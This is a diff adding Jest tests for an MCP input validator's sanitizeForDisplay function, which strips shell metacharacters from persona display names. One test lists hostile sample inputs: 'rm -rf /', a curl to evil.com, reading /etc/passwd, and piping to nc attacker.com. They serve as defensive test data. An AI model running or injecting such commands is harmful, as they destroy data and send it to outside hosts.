@@ -203,4 +203,112 @@ describe('MCPInputValidator - Enhanced MCP Tool Input Validation', () => {
       });
     });
   });
+
+  describe('sanitizeForDisplay', () => {
+    test('should remove core shell metacharacters', () => {
+      const input = 'test;command&another|pipe`backtick$var(sub)command';
+      const result = MCPInputValidator.sanitizeForDisplay(input);
+
+      // All core shell metacharacters should be removed
+      expect(result).toBe('testcommandanotherpipebacktickvarsubcommand');
+      expect(result).not.toContain(';');
+      expect(result).not.toContain('&');
+      expect(result).not.toContain('|');
+      expect(result).not.toContain('`');
+      expect(result).not.toContain('$');
+      expect(result).not.toContain('(');
+      expect(result).not.toContain(')');
+    });
+
+    test('should preserve safe punctuation and characters', () => {
+      // These should NOT be removed (unlike the broader SHELL_METACHAR_REGEX)
+      const input = 'Hello! How are you? Great* work~';
+      const result = MCPInputValidator.sanitizeForDisplay(input);
+
+      expect(result).toBe('Hello! How are you? Great* work~');
+      expect(result).toContain('!');
+      expect(result).toContain('?');
+      expect(result).toContain('*');
+      expect(result).toContain('~');
+    });
+
+    test('should handle empty and invalid inputs', () => {
+      expect(MCPInputValidator.sanitizeForDisplay('')).toBe('');
+      expect(MCPInputValidator.sanitizeForDisplay(null as any)).toBe('');
+      expect(MCPInputValidator.sanitizeForDisplay(undefined as any)).toBe('');
+      expect(MCPInputValidator.sanitizeForDisplay(123 as any)).toBe('');
+    });
+
+    test('should preserve regular text unchanged', () => {
+      const input = 'Creative Writer - Debug Detective';
+      const result = MCPInputValidator.sanitizeForDisplay(input);
+
+      expect(result).toBe(input);
+    });
+
+    test('should handle persona names with shell metacharacters', () => {
+      // Real-world test case from index.ts usage
+      const personaName = 'Test & Debug (Advanced)';
+      const result = MCPInputValidator.sanitizeForDisplay(personaName);
+
+      expect(result).toBe('Test  Debug Advanced');
+      expect(result).not.toContain('&');
+      expect(result).not.toContain('(');
+      expect(result).not.toContain(')');
+    });
+
+    test('should prevent command injection in display strings', () => {
+      const maliciousInputs = [
+        'innocent; rm -rf /',
+        'test$(curl evil.com)',
+        'data`cat /etc/passwd`',
+        'cmd & shutdown',
+        'input | nc attacker.com 1234',
+        'value $(whoami)'
+      ];
+
+      for (const input of maliciousInputs) {
+        const result = MCPInputValidator.sanitizeForDisplay(input);
+
+        // Core shell metacharacters should be removed
+        expect(result).not.toContain(';');
+        expect(result).not.toContain('$');
+        expect(result).not.toContain('`');
+        expect(result).not.toContain('&');
+        expect(result).not.toContain('|');
+        expect(result).not.toContain('(');
+        expect(result).not.toContain(')');
+      }
+    });
+
+    test('should handle unicode and special characters', () => {
+      const input = 'Hello 世界! Testing™ with emoji 🎭';
+      const result = MCPInputValidator.sanitizeForDisplay(input);
+
+      // Should preserve unicode but remove any shell metacharacters
+      expect(result).toBe(input); // No shell metacharacters to remove
+      expect(result).toContain('世界');
+      expect(result).toContain('™');
+      expect(result).toContain('🎭');
+    });
+
+    test('should match behavior of inline replaceAll pattern', () => {
+      // This test ensures we maintain the same behavior as the original inline code
+      const testCases = [
+        'Test & Development',
+        'Debug (Advanced)',
+        'Run; Stop',
+        'Value $123',
+        'Execute|Command',
+        'Backtick`test'
+      ];
+
+      for (const input of testCases) {
+        const utilityResult = MCPInputValidator.sanitizeForDisplay(input);
+        const inlineResult = input.replaceAll(/[;&|`$()]/g, '');
+
+        expect(utilityResult).toBe(inlineResult);
+      }
+    });
+  });
 });
